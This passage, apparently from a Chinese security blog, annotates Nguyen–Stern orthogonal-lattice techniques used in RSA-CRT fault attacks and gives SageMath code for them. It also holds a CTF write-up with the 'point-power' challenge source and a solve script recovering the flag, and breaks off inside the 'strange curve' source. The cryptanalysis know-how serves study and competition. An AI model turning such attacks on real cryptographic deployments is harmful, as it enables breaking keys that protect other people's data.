$\\boldsymbol{x}$ 是一个 $(L’)^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：<br>$$<br>\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\<br>\\boldsymbol{v}=\\boldsymbol{y}\\mod q<br>$$<br>故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。</p>\n<h3 id=\"拓展阅读-正交格\"><a href=\"#拓展阅读-正交格\" class=\"headerlink\" title=\"拓展阅读-正交格\"></a>拓展阅读-正交格</h3><p>令 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。</p>\n<p>如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。</p>\n<blockquote>\n<p>笔者注记：<br>这里首先将 $\\mathit{\\Lambda}$ 张成一个<strong>有理数空间</strong>，不局限于<strong>整系数</strong>向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是<strong>欧几里得</strong>的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。<br>PS:发现自己念了十年的欧几里得，难怪输入法打不出来（）</p>\n</blockquote>\n<p>令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 <del>（奇怪的表示方法）</del>。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。</p>\n<blockquote>\n<p>笔者注记：<br>看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即<strong>任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$</strong> 。<br>再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，<strong>注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了</strong>，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。<br>至于其维度为何是 $n-d$ ，有个概念叫<strong>正交补</strong>，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。<br>这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。</p>\n</blockquote>\n<p>在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：</p>\n<p>$$<br>\\mathbf{b}_j =<br>\\begin{pmatrix}<br>b_{1,j} \\\\<br>b_{2,j} \\\\<br>\\vdots \\\\<br>b_{n,j}<br>\\end{pmatrix}<br>$$<br>（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）</p>\n<p>定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。</p>\n<blockquote>\n<p>笔者注记：<br>这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）<br>至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为<br>$$<br>\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =<br>\\begin{pmatrix}<br>\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\<br>\\vdots &amp; \\ddots &amp; \\vdots \\\\<br>\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle<br>\\end{pmatrix}<br>$$<br>不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。<br>这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。</p>\n</blockquote>\n<p><strong>定理1</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。<br>证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：<br>$$<br>\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}<br>$$<br>其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。</p>\n<p><strong>推论2</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。</p>\n<p><strong>定理3</strong> 令 $(\\mathbf{b}_1,…,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：</p>\n<ol>\n<li>$\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$</li>\n<li>对任意线性无关的向量 $\\mathbf{x}_1,…,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：</li>\n</ol>\n<p>$$<br>||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,…,||\\mathbf{x}_t||)<br>$$</p>\n<p>我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。</p>\n<p>$$<br>B^-=<br>\\begin{pmatrix}<br>c\\times b_{1,1} &amp; c\\times b_{2,1} &amp; \\cdots &amp; c\\times b_{n,1} \\\\<br>c\\times b_{1,2} &amp; c\\times b_{2,2} &amp; \\cdots &amp; c\\times b_{n,2} \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>c\\times b_{1,d} &amp; c\\times b_{2,d} &amp; \\cdots &amp; c\\times b_{n,d} \\\\<br>1 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1<br>\\end{pmatrix}<br>$$<br>矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。<br>设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。<del>（这段翻译累死我了）</del><br>令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么</p>\n<p>$$<br>p_{\\uparrow}(\\mathbf{y})=<br>\\begin{pmatrix}<br>\\mathbf{y}.\\mathbf{b}_1 \\\\<br>\\vdots \\\\<br>\\mathbf{y}.\\mathbf{b}_d<br>\\end{pmatrix}<br>$$<br>因此，当且仅当 $p_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。</p>\n<p><strong>定理4</strong> 令 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若</p>\n<p>$$<br>c&gt;2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})<br>$$<br>则 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。</p>\n<p>使用阿达马不等式，我们得到以下算法：</p>\n<p><strong>算法5</strong> 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,…,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。</p>\n<ol>\n<li><p>选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$</p>\n</li>\n<li><p>计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 对应的 $n\\times d$ 矩阵 $B=(b_{i,j})$</p>\n</li>\n<li><p>计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$</p>\n</li>\n<li><p>输出 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$</p>\n</li>\n</ol>\n<p>可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）</p>\n<blockquote>\n<p>笔者注记：<br>$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。</p>\n</blockquote>\n<h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    LB = B.transpose().left_kernel(basis=<span class=\"string\">&quot;LLL&quot;</span>).basis_matrix()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<p>但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）<br>于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>),<span class=\"number\">20</span>)    <span class=\"comment\"># this bound can be adjusted as needed</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d,_n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><p><a href=\"https://link.springer.com/chapter/10.1007/BFb0052236\">P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.</a></p>\n</li>\n<li><p><a href=\"https://link.springer.com/article/10.1007/s13389-011-0015-x\">Modulus Fault Attacks Against RSA-CRT Signatures</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/50483906\">知乎 线性代数之——正交向量与子空间</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/187345192\">知乎 格拉姆矩阵（Gram matrix）详细解读</a></p>\n</li>\n</ul>\n","excerpt":"<p>有瓜吃，美滋滋。</p>","more":"<p>题目质量一般，知识问答还全是搬运今年 ciscn 的。<br>然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。</p>\n<h2 id=\"point-power\"><a href=\"#point-power\" class=\"headerlink\" title=\"point-power\"></a>point-power</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag)==<span class=\"number\">42</span></span><br><span class=\"line\">p=getPrime(<span class=\"number\">600</span>)</span><br><span class=\"line\">a=bytes_to_long(flag)</span><br><span class=\"line\">b=randrange(<span class=\"number\">2</span>,p-<span class=\"number\">1</span>)</span><br><span class=\"line\">E=EllipticCurve(GF(p),[a,b])</span><br><span class=\"line\">G=E.random_element()</span><br><span class=\"line\"></span><br><span class=\"line\">x1,y1,_=G</span><br><span class=\"line\">G=<span class=\"number\">2</span>*G</span><br><span class=\"line\">x2,y2,_=G</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;b = <span class=\"subst\">&#123;b&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x1 = <span class=\"subst\">&#123;x1&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x2 = <span class=\"subst\">&#123;x2&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\"><span class=\"string\">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\"><span class=\"string\">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\"><span class=\"string\">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。<br>首先查到椭圆曲线的加法（两点相同的情形）：<br>$$<br>x_2=m^2-2x_1\\pmod p \\ with \\ m=\\frac{3x_1^2+a}{2y_1}<br>$$<br>又在 Sagemath 文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程，exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"number\">3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\">b = <span class=\"number\">1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\">x1 = <span class=\"number\">2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\">x2 = <span class=\"number\">1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"></span><br><span class=\"line\">K = GF(p)</span><br><span class=\"line\">n=(K(x2+<span class=\"number\">2</span>*x1)).sqrt()</span><br><span class=\"line\">P.&lt;x&gt;= PolynomialRing(K)</span><br><span class=\"line\">A=<span class=\"number\">1</span></span><br><span class=\"line\">B=<span class=\"number\">6</span>*x1**<span class=\"number\">2</span>-<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1</span><br><span class=\"line\">C=-(<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*x1**<span class=\"number\">3</span>+<span class=\"number\">4</span>*n**<span class=\"number\">2</span>*b-<span class=\"number\">9</span>*x1**<span class=\"number\">4</span>)</span><br><span class=\"line\">f=A*x**<span class=\"number\">2</span>+B*x+C</span><br><span class=\"line\">roots=f.roots()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(roots)</span><br><span class=\"line\">flag=roots[<span class=\"number\">1</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(<span class=\"built_in\">int</span>(flag)))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strange-curve\"><a href=\"#strange-curve\" class=\"headerlink\" title=\"strange curve\"></a>strange curve</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">P,Q</span>):</span><br><span class=\"line\">    (x1,y1)=P</span><br><span class=\"line\">    (x2,y2)=Q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    x3=(x1+x2)*(<span class=\"number\">1</span>+y1*y2)*invert((<span class=\"number\">1</span>+x1*x2)*(<span class=\"number\">1</span>-y1*y2),p)%p</span><br><span class=\"line\">    y3=(y1+y2)*(<span class=\"number\">1</span>+x1*x2)*invert((<span class=\"number\">1</span>-x1*x2)*(<span class=\"number\">1</span>+y1*y2),p)%p</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x3,y3)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">e,P</span>):</span><br><span class=\"line\">    Q=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    e=e%p</span><br><span class=\"line\">    <span class=\"keyword\">while</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> e&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">            Q=add(Q,P)</span><br><span class=\"line\">        P=add(P,P)</span><br><span class=\"line\">        e&gt;&gt;=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Q</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Legendre</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"built_in\">pow</span>((a%p+p)%p,(p-<span class=\"number\">1</span>)//<span class=\"number\">2</span>,p))%p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_ts</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    p=p-<span class=\"number\">1</span></span><br><span class=\"line\">    count=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> p%<span class=\"number\">2</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">        count+=<span class=\"number\">1</span></span><br><span class=\"line\">        p=p//<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> count,p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_nonre</span>(<span class=\"params\">p</span>):</span><br><span class=\"line\">    a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> Legendre(a,p)==<span class=\"number\">1</span>:</span><br><span class=\"line\">        a=random.randint(<span class=\"number\">1</span>,p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">amm2</span>(<span class=\"params\">a,p</span>):</span><br><span class=\"line\">    t,s=get_ts(p)</span><br><span class=\"line\">    ta=<span class=\"built_in\">pow</span>(get_nonre(p),s,p)</span><br><span class=\"line\">    tb=<span class=\"built_in\">pow</span>(a,s,p)</span><br><span class=\"line\">    h=<span 